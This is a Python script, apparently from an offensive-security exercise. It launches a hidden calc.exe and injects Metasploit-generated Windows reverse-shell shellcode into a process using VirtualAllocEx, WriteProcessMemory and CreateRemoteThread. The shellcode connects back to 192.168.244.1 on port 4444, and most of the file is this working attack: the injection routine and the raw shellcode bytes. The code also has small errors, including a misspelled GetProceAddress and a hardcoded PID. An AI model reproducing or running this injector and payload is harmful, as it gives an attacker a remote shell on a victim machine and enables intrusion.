import sys
from ctypes import *
from my_debugger_defines import*

kernel32=windll.kernel32
PAGE_EXECUTE_READWRITE= 0x40
PROCESS_ALL_ACCESS= (0x1F0FFF)
VIRTUAL_MEM = (0x1000|0x2000)

#this is the original executable
path_to_exe = "C:\\calc.exe"

startupinfo = STARTUPINFO()
process_information = PROCESS_INFORMATION()
creation_flag = CREATE_NEW_CONSOLE
startupinfo.dwFlags = 0x1
startupinfo.wShowWindow = 0x0
startupinfo.cb = sizeof(startupinfo)

#first things first start that 2nd process and store its PID so that we can start our injection

kernel32.CreateProcessA(path_to_exe,
                        None,
                        None,
                        None,
                        None,
                        creation_flag,
                        None,
                        None,
                        byref(startupinfo),
                        byref(process_information))

pid = process_information.dwProcessId

def inject(pid , data, parameter = 0):
    #get the handle of the process we have tot inject into
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not h_process:
        print(pid)
        print("failed to acquire a handle to pid :(")
        sys.exit(0)

    arg_address = kernel32.VirtualAllocEx(h_process,0,len(data),VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), None)

    thread_id = c_ulong(0)

    if not parameter:
        start_address = arg_address
    else:
        h_kernel32= kernel32.GetModuleHandleA("kernel32.dll")
        start_address = kernel32.GetProceAddress(h_kernel32,"LoadLibraryA")
        parameter = arg_address

    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
        print ("[*] Failed to inject the DLL. Exiting.")
        sys.exit(0)
    return True

#/* win32_reverse - EXITFUNC=thread LHOST=192.168.244.1 LPORT=4444
#Size=287 Encoder=None http://metasploit.com */
connect_back_shellcode = \
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \
"\xc0\xa8\xf4\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9" \
"\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \
"\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \
"\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \
"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \
"\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \
"\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6" \
"\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"
inject( 7656, connect_back_shellcode )